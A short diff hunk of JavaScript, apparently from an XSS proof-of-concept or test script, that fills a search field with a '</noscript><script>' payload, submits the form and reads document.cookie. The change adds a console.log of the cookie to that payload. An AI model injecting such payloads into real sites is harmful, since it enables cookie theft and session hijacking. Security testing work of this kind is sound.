@@ -17,7 +17,7 @@
         if (inputField) {
           // Insert payload to the text box
           inputField.value =
-            "</noscript><script>alert(document.cookie)<\/script>";
+            "</noscript><script>alert(document.cookie);console.log(document.cookie)<\/script>";
 
           // Find and click the submit button to submit the form
           var submitButton = document.querySelector("submit#Search");
